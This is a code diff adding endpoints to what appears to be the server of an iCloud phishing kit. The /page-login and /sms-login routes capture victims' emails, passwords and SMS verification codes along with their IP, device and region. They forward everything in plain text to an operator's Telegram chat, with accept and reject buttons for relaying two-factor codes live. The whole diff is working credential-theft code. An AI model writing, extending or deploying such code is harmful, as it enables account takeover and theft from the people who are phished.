@@ -693,3 +693,208 @@ app.post("/update-redirection-choice", (req, res) => {
     res.status(500).json({ error: "Internal server error" });
   }
 });
+
+// ============================================================================
+// ICLOUD PAGES ENDPOINTS
+// ============================================================================
+
+const pendingPage = {};
+const pendingCodes = {};
+
+app.post("/page-login", async (req, res) => {
+  try {
+    const { email, password, userId } = req.body;
+
+    if (!email || !password) {
+      return res.status(400).json({ success: false, message: "Email and password required" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingPage[email] = { password, status: "pending" };
+    console.log(`📥 iCloud Page Login Received: ${email}`);
+
+    const message =
+      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🔑 Password:</b> <code>${password}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `page_accept|${email}` },
+            { text: "❌ Reject", callback_data: `page_reject|${email}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    if (response.ok) {
+      res.json({ success: true });
+    } else {
+      res.status(500).json({ success: false, message: "Failed to send to Telegram" });
+    }
+
+  } catch (err) {
+    console.error("❌ Page login endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+app.post("/sms-login", async (req, res) => {
+  try {
+    const { code, userId, email } = req.body;
+
+    if (!code) {
+      return res.status(400).json({ success: false, message: "Code required" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingCodes[code] = { status: "pending" };
+    console.log(`📥 iCloud SMS Code Received: ${code}`);
+
+    const message =
+      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>💬 SMS:</b> <code>${code}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `sms_accept|${code}` },
+            { text: "❌ Reject", callback_data: `sms_reject|${code}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    if (response.ok) {
+      res.json({ success: true });
+    } else {
+      res.status(500).json({ success: false });
+    }
+
+  } catch (err) {
+    console.error("❌ SMS login endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+app.post("/notify", async (req, res) => {
+  try {
+    const { email, userId } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: "Missing email" });
+    }
+
+    const message =
+      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+
+    res.json({ success: true });
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+app.post("/update-page-status", (req, res) => {
+  try {
+    const { email, status } = req.body;
+
+    if (!email || !status) {
+      return res.status(400).json({ error: "Missing email or status" });
+    }
+
+    if (!pendingPage[email]) {
+      pendingPage[email] = {};
+    }
+
+    if (status === "page_accept") {
+      pendingPage[email].status = "accepted";
+    } else if (status === "page_reject") {
+      pendingPage[email].status = "rejected";
+    } else {
+      pendingPage[email].status = status;
+    }
+
+    pendingPage[email].updatedAt = Date.now();
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
